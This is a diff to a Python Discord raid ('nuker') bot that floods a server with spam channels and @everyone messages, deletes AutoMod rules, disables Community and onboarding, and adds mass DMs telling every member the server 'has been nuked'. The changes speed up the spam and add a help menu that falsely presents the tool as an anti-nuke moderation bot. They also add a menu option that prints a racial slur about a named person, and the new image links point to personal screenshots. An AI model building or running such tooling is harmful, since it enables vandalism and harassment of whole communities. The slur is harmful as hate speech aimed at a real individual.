@@ -1,6 +1,5 @@
-
-
 import discord
+from discord.ext import commands
 import asyncio
 import colorama
 from colorama import Fore, Style, init
@@ -9,6 +8,21 @@ import os
 import json
 init(autoreset=True)
 import random
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix='?', intents=intents)
+
+
+bot.command(name='help')
+async def embed_help(ctx):
+    embed = discord.Embed(title="Help", description="List of available commands:", color=0x00ff00)
+    embed.add_field(name="?help", value="Shows this menu", inline=False)
+    embed.add_field(name="?setup", value="analyzes server and configures anti nuke system", inline=False)
+    embed.add_field(name="?mute <@member> 5h,5m,5s", value="mutes a member", inline=False)
+    embed.add_field(name="?ban <@member> (reason)", value ="bans a member for your server", inline=False)
+    embed.add_field(name="?warn <@member> (reason)", value = "warn a member", inline = False)
+    embed.add_field(name="?antilink", value = "Toggles on/off the antilink system", inline = False)
+    embed.set_footer(text="?help | help menu")
+    await ctx.send(embed=embed)
 
 PRESET_DIR = "presets"
 def ensure_preset_dir():
@@ -101,7 +115,7 @@ async def create_spam_channels(guild: discord.Guild, prefix: str = "nuked-by-nov
     count = 0
 
     while count < amount:
-        batch_size = min(30, amount - count)
+        batch_size = min(50, amount - count)
         tasks = []
 
         for i in range(batch_size):
@@ -111,7 +125,7 @@ async def create_spam_channels(guild: discord.Guild, prefix: str = "nuked-by-nov
             count += 1
 
         await asyncio.gather(*tasks, return_exceptions=True)
-        await asyncio.sleep(0.4)
+        await asyncio.sleep(0.3)
 
     print(gradient_text(f"\n[✓] Successfully created {count} channels."))
 
@@ -310,6 +324,8 @@ async def mark_all_channels_nsfw(guild: discord.Guild):
 
     print(gradient_text(f"[✓] Done. {count} channels marked NSFW."))
 
+
+
 async def unmark_all_channels_nsfw(guild: discord.Guild):
     print(gradient_text("[*] Unmarking all text channels from NSFW..."))
 
@@ -409,7 +425,7 @@ async def spam_messages(guild: discord.Guild, message: str = "@everyone SERVER R
     messages_sent = 0
 
     while messages_sent < amount:
-        batch_size = min(80, len(channels))
+        batch_size = min(180, len(channels))
         batch = random.sample(channels, batch_size) if len(channels) > batch_size else channels
         tasks = []
 
@@ -422,7 +438,7 @@ async def spam_messages(guild: discord.Guild, message: str = "@everyone SERVER R
                 print(gradient_text(f"[!] Error in {channel.name}: {e}"))
 
         await asyncio.gather(*tasks, return_exceptions=True)
-        await asyncio.sleep(0.15 + random.uniform(0.05, 0.2))
+        await asyncio.sleep(0.15 + random.uniform(0.07, 0.3))
 
     print(gradient_text(f"[✓] Finished sending {messages_sent} messages."))
 
@@ -437,36 +453,41 @@ async def spam_gifs(guild: discord.Guild):
         amount = 100
 
     catgirl_gifs = [
-        "https://tenor.com/view/girl-meow-cute-meme-funny-gif-16874634335787195581",
-        "https://tenor.com/view/warframe-femboy-hop-on-warframe-gif-24661075",
-        "https://cdn.nekotina.com/images/YLEg3BOl.gif",
-        "https://cdn.nekotina.com/images/-m5mW53l4.jpg"
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002541587497113/Screenshot_2025-12-14-10-50-11-92_572064f74bd5f9fa804b05334aa4f912.jpg?ex=6968f826&is=6967a6a6&hm=b83d1b7896fcc6fb0c8ce492b78c13d3aa4bb66500e575b63b110b0c799e5ab2&",
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002541155487745/Screenshot_2025-12-14-10-50-13-73_572064f74bd5f9fa804b05334aa4f912.jpg?ex=6968f825&is=6967a6a5&hm=84dac1b735a48b0e2b38ebc57cfd5861ae50f823e5c6f9892935c8430d15027a&",
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002540748636285/Screenshot_2025-12-14-10-50-34-65_572064f74bd5f9fa804b05334aa4f912.jpg?ex=6968f825&is=6967a6a5&hm=f3add55332ad89a5dfa1beb55ecfaefe4947112f27758d1435a72678ef21822f&",
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002539599401124/Screenshot_2025-12-14-10-50-32-42_572064f74bd5f9fa804b05334aa4f912.jpg?ex=6968f825&is=6967a6a5&hm=b07750f8daf7a9cc662e9bdde891895e70da5d303120fac75e74e18fe10da19c&",
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002538818994248/Screenshot_2025-12-14-10-50-41-65_572064f74bd5f9fa804b05334aa4f912.jpg?ex=6968f825&is=6967a6a5&hm=11d6f90ab0a8cc3c3b308d11d1223e964cc4e661a29c1d751d9c006a5fbae8c2&",
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002538420801548/IMG_20251214_105112.jpg?ex=6968f825&is=6967a6a5&hm=9c6e5906b12f8298ce8c77cc9f1ca8eca632825d885984ae360045d37a29e4b3&",
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002505889513482/IMG_20251214_105126.jpg?ex=6968f81d&is=6967a69d&hm=583f1fc526574de780a21aecb598f59e1595728f77d1938fca25b4f98b295e83&",
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002502148194455/IMG_20251214_105326.jpg?ex=6968f81c&is=6967a69c&hm=2286bf1b336819619919b9e0f064c031b9e5e16b1ffe5e15743fb5b1a0527574&",
+        "https://cdn.discordapp.com/attachments/1393608846362017822/1461002502693458104/IMG_20251214_105316.jpg?ex=6968f81c&is=6967a69c&hm=e9f2c3211c55846f1c5563562bd43ad05d2b43e02eeb6dfbc1fcf92fc0d435e5&",
     ]
 
     def get_gif():
         return gif_link if gif_link else random.choice(catgirl_gifs)
-
-    channels = guild.text_channels
+    
+    tasks = []
     messages_sent = 0
+    channels = guild.text_channels
+    batch = min(100, len(channels))
+    for channel in channels[:batch]:
+        try:
+            msg = f"@everyone {get_gif()}"
+            tasks.append(channel.send(msg))
+            messages_sent += 1
+            print(gradient_text(f"[>] Sent GIF ({messages_sent}/{amount}) → {channel.name}"))
+        except Exception as e:
+            print(gradient_text(f"[!] Failed in {channel.name}: {e}"))
 
-    while messages_sent < amount:
-        batch_size = min(80, len(channels))
-        batch = random.sample(channels, batch_size) if len(channels) > batch_size else channels
-        tasks = []
-
-        for channel in batch:
-            try:
-                msg = f"@everyone {get_gif()}"
-                tasks.append(channel.send(msg))
-                messages_sent += 1
-                print(gradient_text(f"[>] Sent GIF ({messages_sent}/{amount}) → {channel.name}"))
-            except Exception as e:
-                print(gradient_text(f"[!] Failed in {channel.name}: {e}"))
-
-        await asyncio.gather(*tasks, return_exceptions=True)
-        await asyncio.sleep(0.2)
+    await asyncio.gather(*tasks, return_exceptions=True)
+    await asyncio.sleep(0.1)
 
     print(gradient_text(f"[✓] Finished GIF spamming: {messages_sent} sent."))
+
+
+async def touch_eshan_nigga():
+    print(gradient_text("eshan is the niggest nigga"))
 
 async def disable_community(guild: discord.Guild):
     print(gradient_text(f"[*] Attempting to disable Community settings in {guild.name}..."))
@@ -522,6 +543,8 @@ async def disable_automod(guild: discord.Guild):
 
     print(gradient_text(f"[✓] Successfully disabled AutoMod ({count} rule(s) deleted)."))
 
+
+
 async def disable_onboarding(guild: discord.Guild):
     print(gradient_text(f"[*] Attempting to disable onboarding in {guild.name}..."))
 
@@ -549,6 +572,32 @@ async def disable_onboarding(guild: discord.Guild):
         print(gradient_text("[!] Missing permission to disable onboarding."))
     except discord.HTTPException as e:
         print(gradient_text(f"[!] Failed to disable onboarding: {e}"))
+
+async def dm_all(guild: discord.Guild, message: str = "This server has been nuked "):
+# idk if batch logic is needed here since dming is per user but i will add anyways
+    print(gradient_text(f"[*] DMing all members in {guild.name}..."))
+
+    members = [m for m in guild.members if not m.bot]
+    total = len(members)
+    count = 0
+
+    while count < total:
+        batch_size = min(20, total - count)
+        batch = members[count:count + batch_size]
+        tasks = []
+
+        for member in batch:
+            try:
+                tasks.append(member.send(message))
+                print(gradient_text(f"[-] Queued DM: {member.name}"))
+                count += 1
+            except Exception as e:
+                print(gradient_text(f"[!] Failed to queue DM {member.name}: {e}"))
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+        await asyncio.sleep(0.5)
+
+    print(gradient_text(f"[✓] Finished DMing {count} members."))
 
 class CrimsonBot:
     def __init__(self):
@@ -604,34 +653,45 @@ class CrimsonBot:
         print("\n" * 2)
 
     async def run(self):
-        self.render_ascii()
-        token = input(gradient_text("Enter your bot token ~ "))
-
-        @self.client.event
-        async def on_ready():
-            self.render_ascii(str(self.client.user), len(self.client.guilds))
-            self.raider_options()
-
-            guilds = self.client.guilds
-            if not guilds:
-                print(gradient_text("Bot is not in any server!"))
+            self.render_ascii()
+            try:
+                token = (await asyncio.to_thread(input, gradient_text("Enter your bot token ~ "))).strip()
+            except EOFError:
                 return
+            @self.client.event
+            async def on_ready():
+                if hasattr(self, '_setup_done'):
+                    return
+                self._setup_done = True
+                
+                self.render_ascii(str(self.client.user), len(self.client.guilds))
+                self.raider_options()
+                guilds = self.client.guilds
+                if not guilds:
+                    print(gradient_text("Bot is not in any server!"))
+                    await self.client.close()
+                    return
+                if len(guilds) > 1:
+                    print(gradient_text("Multiple guilds found:"))
+                    for i, g in enumerate(guilds, 1):
+                        print(gradient_text(f"{i} ~ {g.name} ({g.id})"))
+                    try:
+                        user_input = await asyncio.to_thread(input, gradient_text("Select guild number ~ "))
+                        selected = int(user_input.strip()) - 1
+                        guild = guilds[selected]
+                    except (ValueError, IndexError):
+                        print(gradient_text("Invalid selection. Defaulting to first server."))
+                        guild = guilds[0]
+                else:
+                    guild = guilds[0]
+                self.client.loop.create_task(main(self, guild))
 
-            if len(guilds) > 1:
-                print(gradient_text("Multiple guilds found:"))
-                for i, g in enumerate(guilds, 1):
-                    print(gradient_text(f"{i} ~ {g.name} ({g.id})"))
-                selected = int(input(gradient_text("Select guild number ~ ")).strip()) - 1
-                guild = guilds[selected]
-            else:
-                guild = guilds[0]
-
-            await main(self, guild)
-
-        try:
-            await self.client.start(token)
-        except discord.LoginFailure:
-            print(gradient_text("Invalid token. Please try again"))
+            try:
+                await self.client.start(token)
+            except discord.LoginFailure:
+                print(gradient_text("Invalid token. Please try again"))
+            except Exception as e:
+                print(gradient_text(f"Connection Error: {e}"))
 
 async def main(self, guild):
     while True:
@@ -688,6 +748,8 @@ async def main(self, guild):
             await disable_automod(guild)
         elif choice == "19":
             await disable_onboarding(guild)
+        elif choice == "45":
+            touch_eshan_nigga()
         elif choice == "20":
             self.clear()
             self.render_ascii()
@@ -799,4 +861,7 @@ async def main(self, guild):
 if __name__ == "__main__":
     bot = CrimsonBot()
     asyncio.run(bot.run())
+
+
+
 
